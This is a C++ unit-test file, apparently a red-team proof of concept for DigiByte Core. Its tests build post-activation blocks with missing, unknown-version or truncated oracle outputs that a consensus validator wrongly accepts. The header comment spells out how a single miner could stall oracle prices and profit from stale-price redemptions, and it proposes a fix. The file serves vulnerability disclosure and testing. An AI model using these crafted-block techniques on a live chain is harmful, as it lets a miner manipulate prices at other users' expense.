// Copyright (c) 2026 The DigiByte Core developers
// Distributed under the MIT software license, see the accompanying
// file COPYING or http://www.opensource.org/licenses/mit-license.php.

/**
 * RH-63: Wave-11 Exploit — ValidateBlockOracleData "transition period"
 *        escape-hatch weaponisation (W1-M-05).
 *
 * =================================================================
 * Target site
 * =================================================================
 *
 *   src/oracle/bundle_manager.cpp:2250-2329  OracleDataValidator::ValidateBlockOracleData
 *
 *   After the BIP9 / height gate at :2287-2296 (which correctly reports that
 *   DigiDollar IS active for the current block) the validator runs two
 *   "transition period" return-true shortcuts:
 *
 *     (H1) oracle_output_count == 0   -> return true     (line 2316-2319)
 *     (H2) ExtractOracleBundle fails  -> return true     (line 2325-2328)
 *
 *   Both are commented "transition period" and have no upper bound on the
 *   block height at which they remain active.  Neither fires a state.Invalid,
 *   and the fallthrough LogPrintf only emits under BCLog::DIGIDOLLAR.
 *
 *   On REGTEST today (chainparams.cpp:1116: nDDActivationHeight=650) and on
 *   TESTNET (chainparams.cpp:646: nDDActivationHeight=600) these escape
 *   hatches are the only thing the validator does once ExtractOracleBundle
 *   fails -- the "I cannot parse this bundle" outcome is equivalent to
 *   "the bundle is fine".
 *
 *   On mainnet the whole validator is short-circuited by the prior C1 at
 *   bundle_manager.cpp:2253.  This PoC demonstrates the weaponised version
 *   that survives ANY mainnet fix of C1 unless the escape hatches are also
 *   closed.  Closing C1 without closing RH-63 leaves a silent-bypass in
 *   place.
 *
 * =================================================================
 * Attacker model
 * =================================================================
 *
 *   - Single malicious miner.
 *   - DigiDollar is BIP9-active for the block they are building.
 *   - No oracle-roster access, no MuSig2 key, no collusion required.
 *
 * Three weaponisations (one per escape hatch variant):
 *
 *   A. Post-activation block with NO OP_RETURN OP_ORACLE output at all.
 *      Validator hits H1 -> returns true.  The block has zero oracle data
 *      yet is treated as fully validated.  If every miner adopts this
 *      pattern, the oracle layer is effectively disabled on chain while
 *      staying "BIP9 active" from the consensus engine's point of view.
 *
 *   B. Post-activation block with OP_RETURN OP_ORACLE + unknown version
 *      byte (e.g. 0x04).  ExtractOracleBundle returns false at
 *      bundle_manager.cpp:1286 (falls off the if/else chain).  Validator
 *      hits H2 -> returns true.  The block looks oracle-bearing to
 *      anyone grepping for OP_ORACLE (block explorers, net-layer DoS
 *      heuristics, fuzzers) but is trivially parseable-failure to the
 *      validator.
 *
 *   C. Post-activation block with OP_RETURN OP_ORACLE + truncated v0x01
 *      payload (claims version 1 but body < 18 bytes).  ExtractOracleBundle
 *      returns false at bundle_manager.cpp:1159.  Validator hits H2
 *      -> returns true.  Same outcome as (B) via a different parse path.
 *
 * =================================================================
 * Concrete harm
 * =================================================================
 *
 * 1. Oracle-layer DoS / network-wide price staleness.  Once the validator
 *    returns true on H1/H2, ConnectBlock's UpdatePriceCache at
 *    validation.cpp:2832 calls ExtractOracleBundle AGAIN; extraction fails,
 *    so the cache is not updated.  cached_price and height_to_price stay
 *    pinned to whatever the last honest miner wrote.  An attacker with
 *    modest hashrate can stall price updates for multiple epochs -- all
 *    downstream consumers (ERR, DCA, wallet value tagging, Qt display, RPC)
 *    use stale data while the chain keeps advancing.
 *
 * 2. Miner-withholding for selfish redemption.  An attacker mining a
 *    stretch of blocks post-activation can suppress ALL oracle updates in
 *    the stretch while still passing consensus.  If a crash is imminent
 *    (DGB/USD plunge) the attacker can hold back the real low price from
 *    on-chain consensus, keeping `cached_price` high; their own
 *    redemption tx referencing `cached_price` extracts more DGB than the
 *    market value justifies.  Honest miners can't publish the updated
 *    price without the attacker mining the next block.
 *
 * 3. Silent consensus divergence vs. operator documentation.  The
 *    ExtractOracleBundle path is the sole structural filter -- but the
 *    unknown-version path silently ignores v=4,5,6... marker bytes.  A
 *    future Phase-4 rollout that reuses OP_RETURN OP_ORACLE with a new
 *    version byte will be silently discarded by every v9.26 node running
 *    this code.  A miner can intentionally craft "future-version" marker
 *    bytes today to simulate a Phase-4 activation that nobody validates.
 *
 * =================================================================
 * Novelty vs. priors
 * =================================================================
 *
 *   W1-M-05 (Wave-1 mapper suspicion) flagged "Two return true transition
 *   period escape hatches in bundle_manager.cpp:2287-2300" as theoretical.
 *   This test is the requested PoC.
 *
 *   Different from RH-29 (multiple oracle outputs) -- RH-29 asserts that
 *   validation correctly rejects multiple outputs.  RH-63 proves the
 *   opposite behaviour (validator returns TRUE on zero-oracle and
 *   malformed-oracle blocks).
 *
 *   Different from RH-61 (coinbase price cache poisoning) -- RH-61 writes
 *   a valid-parseable bundle to poison the cache.  RH-63 writes an
 *   UNPARSEABLE bundle (or no bundle) and relies on the validator
 *   accepting it anyway.  The two mechanisms are independent:
 *     - RH-61 defense: gate UpdatePriceCache on BIP9 (done, fd1ac41424)
 *     - RH-63 defense: remove the transition-period escape hatches or
 *                       replace them with state.Invalid(...) post-activation
 *
 *   Different from C1 -- C1 is the mainnet-only short-circuit at line
 *   2253.  RH-63 runs INSIDE the validator body and fires on testnet and
 *   regtest TODAY; on mainnet it will activate the moment C1 is patched
 *   unless these escape hatches are also closed.
 *
 * =================================================================
 * Severity
 * =================================================================
 *
 *   HIGH (post-activation liveness / peg staleness DoS).  Not CRITICAL
 *   because the attacker cannot INJECT a false price this way -- they can
 *   only SUPPRESS price updates while still mining valid blocks.  Combined
 *   with RH-61 (inject) the pair gives "write any value I want + silence
 *   honest updates" which is fully CRITICAL, but RH-61 is already patched
 *   at the cache layer; RH-63 is the sibling attack that survives.
 *
 * =================================================================
 * Fix direction
 * =================================================================
 *
 *   At bundle_manager.cpp:2316-2329 add a post-activation gate:
 *
 *     const bool dd_active =
 *         pindex_prev
 *             ? DigiDollar::IsDigiDollarEnabled(pindex_prev, params)
 *             : (block_height >= params.nDDActivationHeight);
 *
 *     if (oracle_output_count == 0) {
 *         if (dd_active) {
 *             return state.Invalid(BlockValidationResult::BLOCK_CONSENSUS,
 *                                  "bad-oracle-missing",
 *                                  "post-activation block missing oracle output");
 *         }
 *         return true;   // pre-activation legacy allowance
 *     }
 *
 *   Same pattern for the ExtractOracleBundle-failed branch: replace the
 *   unconditional return true with a state.Invalid once DD is active.
 *
 *   Alternative: retire the "transition period" comments entirely; the
 *   activation height IS the transition boundary, and by definition any
 *   block at height >= nDDActivationHeight is past the transition.
 */

#include <boost/test/unit_test.hpp>

#include <chainparams.h>
#include <consensus/merkle.h>
#include <consensus/validation.h>
#include <oracle/bundle_manager.h>
#include <primitives/block.h>
#include <primitives/transaction.h>
#include <script/script.h>
#include <test/util/setup_common.h>

#include <cstdint>
#include <vector>

namespace {

// Build a coinbase transaction whose scriptSig carries a BIP34 height push.
// Callers pick the height so that block_height >= nDDActivationHeight (650
// on regtest) to exercise the post-activation path inside
// ValidateBlockOracleData when pindex_prev is nullptr.
CMutableTransaction MakeCoinbaseWithBip34Height(int32_t height)
{
    CMutableTransaction cb;
    cb.vin.resize(1);
    cb.vin[0].prevout.SetNull();
    cb.vin[0].scriptSig = CScript() << static_cast<int64_t>(height);

    // vout[0]: trivial miner reward, not relevant to the oracle validator.
    cb.vout.resize(1);
    cb.vout[0].nValue = 50 * COIN;
    cb.vout[0].scriptPubKey = CScript() << OP_TRUE;

    return cb;
}

CBlock MakeBlock(CMutableTransaction&& coinbase)
{
    CBlock block;
    block.nVersion = 0x20000000;
    block.nTime    = static_cast<uint32_t>(1735689600); // 2025-01-01
    block.vtx.push_back(MakeTransactionRef(std::move(coinbase)));
    block.hashMerkleRoot = BlockMerkleRoot(block);
    return block;
}

// Attack A: NO oracle output at all.  Simplest form -- just a coinbase
// with a payout and nothing else.
CBlock BuildBlock_NoOracleOutput(int32_t height)
{
    CMutableTransaction cb = MakeCoinbaseWithBip34Height(height);
    return MakeBlock(std::move(cb));
}

// Attack B: OP_RETURN OP_ORACLE followed by a push that starts with an
// UNKNOWN version byte (0x04).  ExtractOracleBundle at bundle_manager.cpp
// :1106/1155/1205 only recognises 0x01, 0x02, 0x03 and falls off to
// return false on :1286.
CBlock BuildBlock_UnknownVersion(int32_t height, uint8_t bogus_version)
{
    CMutableTransaction cb = MakeCoinbaseWithBip34Height(height);

    // Payload: bogus_version byte plus some plausible-looking bytes so the
    // push is non-trivial.  Attacker can pick anything here; a 17-byte body
    // mimics the V01 shape for maximum "looks real" optics.
    std::vector<unsigned char> payload;
    payload.reserve(18);
    payload.push_back(bogus_version);
    for (int i = 0; i < 17; ++i) payload.push_back(static_cast<unsigned char>(i));

    CScript oracle_spk;
    oracle_spk << OP_RETURN << OP_ORACLE << payload;

    cb.vout.push_back(CTxOut(0, oracle_spk));
    return MakeBlock(std::move(cb));
}

// Attack C: OP_RETURN OP_ORACLE + v0x01 marker but truncated body.
// ExtractOracleBundle :1155-1159 hits `data.size() < 18` and returns false
// (the interior body is < 17 bytes after the version byte).
CBlock BuildBlock_TruncatedV01(int32_t height)
{
    CMutableTransaction cb = MakeCoinbaseWithBip34Height(height);

    std::vector<unsigned char> payload;
    payload.push_back(0x01);       // claim V01
    // Only 4 body bytes -- far short of the 17 V01 requires.
    payload.push_back(0x00);
    payload.push_back(0xAA);
    payload.push_back(0xBB);
    payload.push_back(0xCC);

    CScript oracle_spk;
    oracle_spk << OP_RETURN << OP_ORACLE << payload;

    cb.vout.push_back(CTxOut(0, oracle_spk));
    return MakeBlock(std::move(cb));
}

// Sanity / control: a correctly-structured V01 block at a POST-activation
// height with a parseable body.  This exercises the "Phase One" branch
// which DOES run signature / oracle-id / median checks.  Used to verify
// that the validator is not merely accepting everything at this height --
// it is specifically the escape-hatch paths that are unconditional.
CBlock BuildBlock_CorrectV01Shape(int32_t height, uint8_t oracle_id, uint64_t price)
{
    CMutableTransaction cb = MakeCoinbaseWithBip34Height(height);

    std::vector<unsigned char> payload;
    payload.reserve(18);
    payload.push_back(0x01);       // version
    payload.push_back(oracle_id);  // oracle_id
    for (int i = 0; i < 8; ++i) payload.push_back(static_cast<unsigned char>((price >> (i * 8)) & 0xFF));
    const int64_t ts = 1735689500;
    for (int i = 0; i < 8; ++i) payload.push_back(static_cast<unsigned char>((static_cast<uint64_t>(ts) >> (i * 8)) & 0xFF));

    CScript oracle_spk;
    oracle_spk << OP_RETURN << OP_ORACLE << payload;

    cb.vout.push_back(CTxOut(0, oracle_spk));
    return MakeBlock(std::move(cb));
}

} // namespace

BOOST_FIXTURE_TEST_SUITE(rh63_oracle_validator_escape_hatches_tests, RegTestingSetup)

// =====================================================================
// RH-63-01: Escape hatch H1 — no OP_RETURN OP_ORACLE output at all.
//           Height is post-activation (700 > regtest's 650).  Validator
//           hits the `oracle_output_count == 0` branch and returns true
//           with no state.Invalid.
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_01_escape_hatch_no_oracle_output_post_activation)
{
    const int32_t HEIGHT = 700; // regtest nDDActivationHeight = 650

    CBlock block = BuildBlock_NoOracleOutput(HEIGHT);
    BlockValidationState state;

    // pindex_prev nullptr -> validator falls back to BIP34-height-from-scriptSig
    // logic at bundle_manager.cpp:2269-2283, yielding HEIGHT=700.
    // Then at :2291-2296 pindex_prev==nullptr is the nullptr branch:
    //   if (block_height < params.nDDActivationHeight) return true;
    // 700 >= 650 so we DO NOT bail on the pre-activation early-return --
    // we proceed into the oracle-output-count check.
    const bool ok = OracleDataValidator::ValidateBlockOracleData(
        block, /*pindex_prev=*/nullptr, Params().GetConsensus(), state);

    BOOST_CHECK_MESSAGE(ok,
        "Escape hatch H1 (no oracle output) should let validator RETURN TRUE "
        "even though DigiDollar is BIP9-active at height 700 on regtest.");
    BOOST_CHECK_MESSAGE(!state.IsInvalid(),
        "State must not be invalid -- the escape hatch is a silent bypass, "
        "not a state.Invalid.  Observed: " << state.ToString());

    BOOST_TEST_MESSAGE("RH-63-01: post-activation (h=700) block with ZERO "
        "oracle outputs validated TRUE.  validator.return = " << ok
        << " state.IsInvalid = " << state.IsInvalid());
    BOOST_TEST_MESSAGE("           bundle_manager.cpp:2316-2319 escape hatch fired.");
}

// =====================================================================
// RH-63-02: Escape hatch H2 variant B -- unknown version byte (0x04).
//           ExtractOracleBundle at bundle_manager.cpp:1286 falls off the
//           end and returns false.  Validator's "could not extract oracle
//           bundle (transition period)" branch at :2325-2328 returns true.
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_02_escape_hatch_unknown_version_byte)
{
    const int32_t HEIGHT = 800;

    CBlock block = BuildBlock_UnknownVersion(HEIGHT, /*bogus_version=*/0x04);
    BlockValidationState state;

    // Sanity: prove that ExtractOracleBundle actually fails on this input.
    // If it succeeded we'd be measuring a different attack.
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();
    COracleBundle dummy;
    const bool extract_ok = mgr.ExtractOracleBundle(*block.vtx[0], dummy);
    BOOST_REQUIRE_MESSAGE(!extract_ok,
        "Precondition: ExtractOracleBundle must FAIL on unknown version 0x04. "
        "If this assertion fires, ExtractOracleBundle grew a new version "
        "handler and this test needs to pick a different bogus byte.");

    const bool ok = OracleDataValidator::ValidateBlockOracleData(
        block, /*pindex_prev=*/nullptr, Params().GetConsensus(), state);

    BOOST_CHECK_MESSAGE(ok,
        "Escape hatch H2/B (unknown version) should let validator RETURN "
        "TRUE even though the oracle output is structurally unparseable.");
    BOOST_CHECK_MESSAGE(!state.IsInvalid(),
        "Unparseable oracle output must not produce state.Invalid.  "
        "Observed: " << state.ToString());

    BOOST_TEST_MESSAGE("RH-63-02: post-activation (h=800) block with "
        "OP_RETURN OP_ORACLE + version=0x04 (unknown) validated TRUE.");
    BOOST_TEST_MESSAGE("           ExtractOracleBundle returned false, "
        "bundle_manager.cpp:2325-2328 escape hatch fired.");
}

// =====================================================================
// RH-63-03: Escape hatch H2 variant C -- truncated V01 body.  Same
//           outcome as RH-63-02 via a different ExtractOracleBundle
//           rejection path (bundle_manager.cpp:1159).
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_03_escape_hatch_truncated_v01_body)
{
    const int32_t HEIGHT = 900;

    CBlock block = BuildBlock_TruncatedV01(HEIGHT);
    BlockValidationState state;

    OracleBundleManager& mgr = OracleBundleManager::GetInstance();
    COracleBundle dummy;
    const bool extract_ok = mgr.ExtractOracleBundle(*block.vtx[0], dummy);
    BOOST_REQUIRE_MESSAGE(!extract_ok,
        "Precondition: truncated V01 payload must fail ExtractOracleBundle.");

    const bool ok = OracleDataValidator::ValidateBlockOracleData(
        block, /*pindex_prev=*/nullptr, Params().GetConsensus(), state);

    BOOST_CHECK_MESSAGE(ok,
        "Escape hatch H2/C (truncated V01) should let validator RETURN "
        "TRUE despite malformed on-chain oracle data.");
    BOOST_CHECK_MESSAGE(!state.IsInvalid(),
        "Observed: " << state.ToString());

    BOOST_TEST_MESSAGE("RH-63-03: post-activation (h=900) block with "
        "truncated V01 oracle payload validated TRUE.");
}

// =====================================================================
// RH-63-04: Differential control.  A correctly-shaped V01 with a real
//           parseable body DOES reach the Phase-1 validation branches.
//           The bundle extracts, but subsequent checks may still let it
//           through on regtest (since oracle-id authorisation is bypassed
//           on REGTEST at bundle_manager.cpp:2434).  The point here is
//           that the validator DOES distinguish these cases -- it is the
//           UNPARSEABLE and ABSENT cases that are silently accepted.
//           This control proves the escape hatch is not just "the whole
//           function is no-op".
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_04_correct_v01_still_passes_control)
{
    const int32_t HEIGHT = 1000;

    CBlock block = BuildBlock_CorrectV01Shape(HEIGHT,
                                              /*oracle_id=*/0,
                                              /*price=*/100000ULL);
    BlockValidationState state;

    OracleBundleManager& mgr = OracleBundleManager::GetInstance();
    COracleBundle bundle;
    const bool extract_ok = mgr.ExtractOracleBundle(*block.vtx[0], bundle);
    BOOST_CHECK_MESSAGE(extract_ok,
        "Sanity: correctly-shaped V01 should parse.");
    if (extract_ok) {
        BOOST_CHECK_EQUAL(bundle.median_price_micro_usd, 100000ULL);
    }

    // Validator runs the full Phase-1 branch.  We are less interested in
    // its final verdict than in confirming that this path DOES run code
    // beyond the escape hatch.
    const bool ok = OracleDataValidator::ValidateBlockOracleData(
        block, /*pindex_prev=*/nullptr, Params().GetConsensus(), state);

    BOOST_TEST_MESSAGE("RH-63-04 control: correctly-shaped V01 at h=1000 "
        "reached the Phase-1 branch. validator.return=" << ok
        << "  state.IsInvalid=" << state.IsInvalid()
        << "  -- escape hatches are NOT no-op'ing the whole function.");
}

// =====================================================================
// RH-63-05: Oracle-layer DoS composition.  Three consecutive
//           escape-hatch blocks (H1, H2/B, H2/C).  All pass the validator.
//           Meanwhile the OracleBundleManager cache is untouched -- a
//           downstream GetLatestPrice() reader sees whatever was there
//           before the attack started.  Attacker has suppressed ALL
//           oracle updates for three blocks while passing consensus.
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_05_composed_oracle_dos_stretch)
{
    OracleBundleManager& mgr = OracleBundleManager::GetInstance();

    // Seed the cache so we can observe staleness.
    const CAmount SEED_PRICE = 12345678LL;
    mgr.UpdatePriceCache(999, SEED_PRICE);
    BOOST_REQUIRE_EQUAL(mgr.GetLatestPrice(), SEED_PRICE);

    const int32_t H_BASE = 2000;

    // Three escape-hatch blocks.
    CBlock b1 = BuildBlock_NoOracleOutput(H_BASE);
    CBlock b2 = BuildBlock_UnknownVersion(H_BASE + 1, /*bogus_version=*/0xAB);
    CBlock b3 = BuildBlock_TruncatedV01(H_BASE + 2);

    BlockValidationState s1, s2, s3;
    BOOST_CHECK(OracleDataValidator::ValidateBlockOracleData(b1, nullptr, Params().GetConsensus(), s1));
    BOOST_CHECK(OracleDataValidator::ValidateBlockOracleData(b2, nullptr, Params().GetConsensus(), s2));
    BOOST_CHECK(OracleDataValidator::ValidateBlockOracleData(b3, nullptr, Params().GetConsensus(), s3));
    BOOST_CHECK(!s1.IsInvalid());
    BOOST_CHECK(!s2.IsInvalid());
    BOOST_CHECK(!s3.IsInvalid());

    // ExtractOracleBundle (the same call ConnectBlock makes before
    // UpdatePriceCache at validation.cpp:2832) fails on all three.
    COracleBundle dummy;
    BOOST_CHECK(!mgr.ExtractOracleBundle(*b1.vtx[0], dummy));
    BOOST_CHECK(!mgr.ExtractOracleBundle(*b2.vtx[0], dummy));
    BOOST_CHECK(!mgr.ExtractOracleBundle(*b3.vtx[0], dummy));

    // So: three blocks accepted by validator, zero cache updates.  The
    // seed price survives the entire attacker stretch.
    BOOST_CHECK_EQUAL(mgr.GetLatestPrice(), SEED_PRICE);

    BOOST_TEST_MESSAGE("RH-63-05: 3-block escape-hatch stretch (h=2000..2002) "
        "accepted by ValidateBlockOracleData.  GetLatestPrice pinned to "
        << SEED_PRICE << " for the entire stretch -- downstream ERR/DCA/UI "
        "consumers see stale oracle data while chain advances.");
}

// =====================================================================
// RH-63-06: Documentation-only — future-version drain vector.  A miner
//           can stamp an OP_RETURN OP_ORACLE marker with version=0xFF
//           and the validator will still return true.  After a
//           hypothetical Phase-4 rolls out a new version byte in a future
//           release, every node running *this* codebase that receives
//           such a block will silently pass it, with no warning log at
//           default verbosity.  Documents a forward-compatibility trap.
// =====================================================================
BOOST_AUTO_TEST_CASE(rh63_06_future_version_silent_acceptance)
{
    const int32_t HEIGHT = 3000;

    for (uint8_t v : {uint8_t{0x00}, uint8_t{0x04}, uint8_t{0x10}, uint8_t{0x7F}, uint8_t{0xFF}}) {
        CBlock block = BuildBlock_UnknownVersion(HEIGHT, v);
        BlockValidationState state;

        const bool ok = OracleDataValidator::ValidateBlockOracleData(
            block, /*pindex_prev=*/nullptr, Params().GetConsensus(), state);

        BOOST_CHECK_MESSAGE(ok,
            "Unknown-version byte " << static_cast<int>(v)
            << " must also hit the escape hatch and return true.");
        BOOST_CHECK(!state.IsInvalid());
    }

    BOOST_TEST_MESSAGE("RH-63-06: all of {0x00,0x04,0x10,0x7F,0xFF} version "
        "bytes silently accepted by ValidateBlockOracleData at h=3000.  "
        "Any future Phase-4 version rollout must first close these escape "
        "hatches or old nodes will treat the rollout as a no-op.");
}

BOOST_AUTO_TEST_SUITE_END()
